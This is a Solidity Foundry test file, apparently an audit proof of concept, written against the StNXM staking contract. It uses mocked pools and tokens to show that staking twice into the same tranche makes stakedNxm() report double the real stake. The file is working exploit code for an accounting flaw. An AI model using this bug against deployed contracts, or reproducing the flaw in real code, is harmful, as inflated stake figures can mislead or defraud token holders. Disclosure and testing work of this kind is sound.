// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

import {StNXM} from "../../contracts/core/stNXM.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockERC20 is ERC20 {
    constructor() ERC20("Mock", "MCK") {}

    function wrap(uint256) external {}

    function unwrap(uint256) external {}
}

contract MockNxmMaster {
    function getLatestAddress(bytes2)
        external
        pure
        returns (address)
    {
        return address(0xCAFE);
    }
}

contract MockDex {
    function slot0()
        external
        pure
        returns (
            uint160,
            int24,
            uint16,
            uint16,
            uint16,
            uint8,
            bool
        )
    {
        return (0, 0, 0, 0, 0, 0, true);
    }
}

contract MockPool {
    mapping(uint256 => mapping(uint256 => uint256))
        public deposits;

    function depositTo(
        uint256 amount,
        uint256 trancheId,
        uint256 requestTokenId,
        address
    ) external returns (uint256) {
        uint256 tokenId =
            requestTokenId == 0 ? 100 : requestTokenId;

        deposits[tokenId][trancheId] += amount;

        return tokenId;
    }

    function getDeposit(
        uint256 tokenId,
        uint256 trancheId
    )
        external
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        uint256 amount = deposits[tokenId][trancheId];

        return (amount, 0, amount, 0);
    }

    function getActiveStake()
        external
        pure
        returns (uint256)
    {
        return 1 ether;
    }

    function getStakeSharesSupply()
        external
        pure
        returns (uint256)
    {
        return 1 ether;
    }

    function getPoolId()
        external
        pure
        returns (uint256)
    {
        return 1;
    }

    function withdraw(
        uint256,
        bool,
        bool,
        uint256[] memory
    )
        external
        pure
        returns (uint256, uint256)
    {
        return (0, 0);
    }
}

contract DoubleCountingExploitTest is Test {
    StNXM internal stNxm;
    MockPool internal pool;

    address internal multisig = address(0x123);

    address internal constant WNXM =
        0x0d438F3b5175Bebc262bF23753C1E53d03432bDE;

    address internal constant NXM =
        0xd7c49CEE7E9188cCa6AD8FF264C1DA2e69D4Cf3B;

    address internal constant NXM_MASTER =
        0x01BFd82675DBCc7762C84019cA518e701C0cD07e;

    address internal constant POOL =
        0x5A44002A5CE1c2501759387895A3b4818C3F50b3;

    function setUp() public {
        deployMockERC20(WNXM);
        deployMockERC20(NXM);

        MockNxmMaster master = new MockNxmMaster();
        vm.etch(NXM_MASTER, address(master).code);

        pool = new MockPool();
        vm.etch(POOL, address(pool).code);

        stNxm = new StNXM();
        stNxm.initialize(multisig, 100_000 ether);

        MockDex mockDex = new MockDex();

        for (uint256 slot = 200; slot < 300; slot++) {
            vm.store(
                address(stNxm),
                bytes32(slot),
                bytes32(uint256(uint160(address(mockDex))))
            );

            (bool success, bytes memory data) =
                address(stNxm).staticcall(
                    abi.encodeWithSignature("dex()")
                );

            if (
                success &&
                data.length >= 32 &&
                abi.decode(data, (address)) ==
                address(mockDex)
            ) {
                break;
            }
        }

        stNxm.transferOwnership(multisig);

        vm.prank(multisig);
        stNxm.receiveOwnership();
    }

    function deployMockERC20(address target) internal {
        MockERC20 implementation = new MockERC20();

        vm.etch(target, address(implementation).code);
        deal(target, address(this), 1_000_000 ether);
    }

    function test_DuplicateTrancheIsCountedTwice() public {
        uint256 trancheId = 250;
        uint256 tokenId = 100;

        vm.prank(multisig);
        stNxm.stakeNxm(
            5_000 ether,
            POOL,
            trancheId,
            0
        );

        uint256 initialStakedAmount =
            stNxm.stakedNxm();

        assertEq(
            initialStakedAmount,
            5_000 ether,
            "Initial stake was calculated incorrectly"
        );

        vm.prank(multisig);
        stNxm.stakeNxm(
            1_000 ether,
            POOL,
            trancheId,
            tokenId
        );

        uint256 reportedStakedAmount =
            stNxm.stakedNxm();

        console2.log(
            "Real staked amount:",
            6_000 ether
        );

        console2.log(
            "Reported staked amount:",
            reportedStakedAmount
        );

        assertEq(
            reportedStakedAmount,
            12_000 ether,
            "The duplicate tranche was not counted twice"
        );
    }
}
